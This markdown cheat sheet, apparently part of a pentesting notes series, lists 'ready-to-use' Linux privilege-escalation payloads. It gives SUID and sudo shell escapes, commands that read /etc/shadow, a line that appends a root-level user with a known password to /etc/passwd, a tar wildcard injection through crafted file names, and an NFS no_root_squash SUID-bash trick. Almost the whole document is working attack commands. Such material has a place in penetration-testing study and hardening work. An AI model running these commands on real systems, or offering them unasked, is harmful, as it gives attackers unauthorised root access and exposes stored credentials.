# 04 — Privilege Escalation: Payloads

> Ready-to-use payloads for privilege escalation scenarios.

---

## 🔴 SUID Exploitation Payloads

```bash
# bash -p                       (if bash has SUID)
# python -c 'import os; os.execl("/bin/sh","sh","-p")'
# perl -e 'exec "/bin/sh";'
# find . -exec /bin/sh -p \; -quit
# vim -c ':!/bin/sh'
# awk 'BEGIN {system("/bin/sh -p")}'
# env /bin/sh -p
# less /etc/passwd    → !sh
# more /etc/passwd    → !sh
# man man             → !sh
```

## 🔴 Sudo Payloads (From GTFOBins)

```bash
sudo vim -c ':!/bin/sh'
sudo find / -exec /bin/sh \; -quit
sudo python3 -c 'import os; os.system("/bin/sh")'
sudo perl -e 'exec "/bin/sh";'
sudo awk 'BEGIN {system("/bin/sh")}'
sudo env /bin/sh
sudo less /etc/shadow && !sh
sudo man man && !sh
sudo ftp && !sh
sudo git help config && !sh
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec="/bin/sh"
sudo zip /tmp/t.zip /tmp/t -T --unzip-command="sh -c /bin/sh"
sudo ssh -o ProxyCommand='sh -c "sh <&2 1>&2"' x
sudo node -e 'require("child_process").spawn("/bin/sh",{stdio:[0,1,2]})'
sudo ruby -e 'exec "/bin/sh"'
sudo lua -e 'os.execute("/bin/sh")'
LFILE=/etc/shadow && sudo tee < "$LFILE"
```

## 🔴 Writable /etc/passwd

```bash
# Generate hash
openssl passwd -1 -salt hacker password123

# Add root-level user
echo 'hacker:$1$hacker$6luIRwdGpBvXdP.GMwcpF/:0:0:root:/root:/bin/bash' >> /etc/passwd

# Login as root
su hacker  # password: password123
```

## 🔴 Wildcard Injection (tar)

```bash
# If cron runs: tar czf /tmp/backup.tar.gz *
# In the same directory:
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
# Wait for cron → /tmp/rootbash -p
```

## 🔴 NFS no_root_squash

```bash
# On attacker (as root):
mount -t nfs TARGET:/shared_dir /mnt
cp /bin/bash /mnt/rootbash
chmod +s /mnt/rootbash
# On target:
/shared_dir/rootbash -p
```
